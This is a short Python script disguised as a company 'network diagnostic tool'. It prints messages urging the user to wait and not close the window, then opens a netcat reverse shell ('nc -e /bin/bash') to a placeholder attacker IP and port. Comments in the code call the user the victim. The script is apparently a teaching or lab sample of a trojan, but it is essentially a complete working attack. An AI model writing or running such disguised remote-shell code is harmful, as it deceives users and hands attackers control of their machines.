import subprocess, time

def main():

    subprocess.run("echo '***** Welcome to CRAP Company Network Diagnostic Tools *****'", shell=True)
    time.sleep(2)
    subprocess.run("echo 'Please sit back and wait... we are detecting whats wrong on your device. It may take 10-15 mins.'", shell=True)
    subprocess.run("echo 'Reminder: Dont close this window! Your network will be slow again if you do so!'", shell=True)

    # Not all Netcat versions support -e option
    # works on Kali Linux, so the victim will be running Kali Linux (for now)
    subprocess.run("nc -e /bin/bash <ATTACKERS_IP_ADDRESS> <PORT_NUMBER>", shell=True)


if __name__ == "__main__":
    main()